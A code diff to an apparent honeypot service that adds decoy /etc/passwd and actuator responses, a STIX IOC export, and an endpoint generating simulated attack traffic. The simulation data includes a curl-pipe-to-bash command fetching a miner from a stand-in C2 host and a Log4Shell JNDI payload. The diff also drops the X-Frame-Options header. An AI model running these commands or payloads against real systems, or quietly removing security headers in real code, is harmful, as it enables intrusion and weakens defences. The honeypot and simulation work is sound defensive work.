@@ -248,7 +248,6 @@ class SecurityHeadersMiddleware:
                 headers = list(message.get("headers", []))
                 extra = [
                     (b"x-content-type-options", b"nosniff"),
-                    (b"x-frame-options", b"DENY"),
                     (b"referrer-policy", b"strict-origin-when-cross-origin"),
                     (b"permissions-policy", b"geolocation=(), microphone=(), camera=()"),
                 ]
@@ -289,6 +288,7 @@ _DASHBOARD_API_EXACT_PATHS = {
     "/api/sessions",
     "/api/attack-summary",
     "/api/ioc",
+    "/api/simulate",
     "/metrics",
 }
 
@@ -870,6 +870,12 @@ async def api_ioc(format: str = "json", limit: int = 1000) -> Response:
             media_type="text/plain",
             headers={"Content-Disposition": "attachment; filename=baitbox-ioc.txt"},
         )
+    if fmt == "stix":
+        from ..ioc import ioc_feed_to_stix
+        return JSONResponse(
+            ioc_feed_to_stix(feed),
+            headers={"Content-Disposition": "attachment; filename=baitbox-ioc.stix.json"},
+        )
     return JSONResponse(feed)
 
 
@@ -880,6 +886,124 @@ async def api_stats() -> dict[str, Any]:
     stats["top_connections"] = get_connection_counts()[:10]
     stats["blocked_ips"] = get_blocked_ips()
     return stats
+
+
+@app.post("/api/simulate")
+async def api_simulate_attack(request: Request) -> dict[str, Any]:
+    """Generate realistic simulated attack traffic for testing and live demonstration."""
+    import random
+    import time
+    from ..geoip import _cache_put, _TTL
+
+    body: dict[str, Any] = {}
+    try:
+        body = await request.json()
+    except Exception:
+        pass
+    scenario = body.get("scenario", "ssh_bruteforce")
+
+    attacker_profiles = [
+        {"ip": "185.220.101.42", "country": "Germany", "countryCode": "DE", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "isp": "Tor Exit Node"},
+        {"ip": "45.154.255.89", "country": "Netherlands", "countryCode": "NL", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "isp": "Datawagon VPS"},
+        {"ip": "194.26.29.112", "country": "Russia", "countryCode": "RU", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "isp": "Aeza Hosting"},
+        {"ip": "103.149.28.18", "country": "Japan", "countryCode": "JP", "city": "Tokyo", "lat": 35.6762, "lon": 139.6503, "isp": "Cloud Hosting JP"},
+        {"ip": "198.51.100.77", "country": "United States", "countryCode": "US", "city": "San Francisco", "lat": 37.7749, "lon": -122.4194, "isp": "DigitalOcean LLC"},
+        {"ip": "177.54.144.12", "country": "Brazil", "countryCode": "BR", "city": "São Paulo", "lat": -23.5505, "lon": -46.6333, "isp": "Telnet Botnet ISP"},
+    ]
+
+    generated: list[dict[str, Any]] = []
+
+    if scenario == "ssh_bruteforce":
+        target = random.choice(attacker_profiles)
+        _cache_put(target["ip"], {
+            "ip": target["ip"], "city": target["city"], "country": target["country"],
+            "countryCode": target["countryCode"], "lat": target["lat"], "lon": target["lon"],
+            "isp": target["isp"], "threat_score": 75,
+        }, time.time() + _TTL)
+        passwords = ["123456", "admin123", "password", "root", "ubuntu2024", "toor", "deploy!"]
+        users = ["root", "admin", "deploy", "ubuntu", "postgres"]
+        for _ in range(random.randint(3, 5)):
+            user = random.choice(users)
+            pwd = random.choice(passwords)
+            ev = await log_event(target["ip"], "SSH", "auth_attempt", {
+                "username": user,
+                "password": pwd,
+                "method": "password",
+            })
+            record_connection(target["ip"], "SSH")
+            enriched = _enrich_event(dict(ev))
+            await pubsub.publish(enriched)
+            generated.append(enriched)
+
+    elif scenario == "web_recon":
+        target = random.choice(attacker_profiles)
+        _cache_put(target["ip"], {
+            "ip": target["ip"], "city": target["city"], "country": target["country"],
+            "countryCode": target["countryCode"], "lat": target["lat"], "lon": target["lon"],
+            "isp": target["isp"], "threat_score": 60,
+        }, time.time() + _TTL)
+        paths = ["/.env", "/wp-login.php", "/.git/config", "/actuator/env", "/phpmyadmin", "/etc/passwd", "/api/v1/users"]
+        uas = ["sqlmap/1.7.2#stable", "Mozilla/5.0 (compatible; Nmap Scripting Engine)", "Nikto/2.1.6", "Go-http-client/1.1"]
+        for p in random.sample(paths, k=min(4, len(paths))):
+            ev = await log_event(target["ip"], "HTTP", "credential_probe", {
+                "method": "GET",
+                "path": p,
+                "query": "",
+                "user_agent": random.choice(uas),
+                "headers": {"host": "web-prod-01", "referer": ""},
+                "body": {},
+                "body_truncated": False,
+            })
+            record_connection(target["ip"], "HTTP")
+            enriched = _enrich_event(dict(ev))
+            await pubsub.publish(enriched)
+            generated.append(enriched)
+
+    elif scenario == "shell_intrusion":
+        target = random.choice(attacker_profiles)
+        _cache_put(target["ip"], {
+            "ip": target["ip"], "city": target["city"], "country": target["country"],
+            "countryCode": target["countryCode"], "lat": target["lat"], "lon": target["lon"],
+            "isp": target["isp"], "threat_score": 90,
+        }, time.time() + _TTL)
+        proto = random.choice(["SSH", "Telnet"])
+        auth_ev = await log_event(target["ip"], proto, "auth_attempt", {"username": "root", "password": "password", "method": "password"})
+        record_connection(target["ip"], proto)
+        enriched_auth = _enrich_event(dict(auth_ev))
+        await pubsub.publish(enriched_auth)
+        generated.append(enriched_auth)
+        commands = ["uname -a", "id", "cat /etc/passwd", "curl -s http://evil-c2.net/miner.sh | bash", "crontab -l"]
+        for cmd in commands[:4]:
+            ev = await log_event(target["ip"], proto, "command", {"command": cmd, "cwd": "/root"})
+            record_connection(target["ip"], proto)
+            enriched = _enrich_event(dict(ev))
+            await pubsub.publish(enriched)
+            generated.append(enriched)
+
+    else:  # critical_exploit
+        target = random.choice(attacker_profiles)
+        _cache_put(target["ip"], {
+            "ip": target["ip"], "city": target["city"], "country": target["country"],
+            "countryCode": target["countryCode"], "lat": target["lat"], "lon": target["lon"],
+            "isp": target["isp"], "threat_score": 100,
+        }, time.time() + _TTL)
+        payload = "${jndi:ldap://log4j.attacker.com:1389/Exploit}"
+        ev = await log_event(target["ip"], "HTTP", "credential_probe", {
+            "method": "POST",
+            "path": "/login",
+            "query": "",
+            "user_agent": payload,
+            "headers": {"host": "web-prod-01", "x-forwarded-for": payload},
+            "body": {"username": payload, "password": "password"},
+            "body_truncated": False,
+        })
+        record_connection(target["ip"], "HTTP")
+        enriched = _enrich_event(dict(ev))
+        await pubsub.publish(enriched)
+        generated.append(enriched)
+
+    return {"status": "ok", "scenario": scenario, "events_generated": len(generated)}
+
 
 
 @app.get("/api/sessions")
@@ -1050,6 +1174,33 @@ async def honeypot(request: Request, path: str) -> Response:
             "[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = https://github.com/example/production.git\n",
             media_type="text/plain", status_code=200,
         )
+
+    # /etc/passwd decoy
+    if path in ("/etc/passwd", "/passwd"):
+        return Response(
+            "root:x:0:0:root:/root:/bin/bash\n"
+            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
+            "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
+            "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
+            "sync:x:4:65534:sync:/bin:/bin/sync\n"
+            "deploy:x:1000:1000:Deployment User,,,:/home/deploy:/bin/bash\n"
+            "ubuntu:x:1001:1001:Ubuntu User,,,:/home/ubuntu:/bin/bash\n",
+            media_type="text/plain",
+            status_code=200,
+        )
+
+    # Spring Boot /actuator decoy
+    if path in ("/actuator", "/actuator/env", "/actuator/health"):
+        return JSONResponse({
+            "status": "UP",
+            "components": {
+                "diskSpace": {"status": "UP", "details": {"total": 21474836480, "free": 12884901888}},
+                "db": {"status": "UP", "details": {"database": "MySQL", "validationQuery": "isValid()"}}
+            },
+            "propertySources": [
+                {"name": "applicationConfig: [classpath:/application.yml]", "properties": {"spring.datasource.password": {"value": "******"}}}
+            ]
+        }, status_code=200)
 
     if path in _DECOY_PATHS or _is_probe_path(path):
         is_post = request.method == "POST"
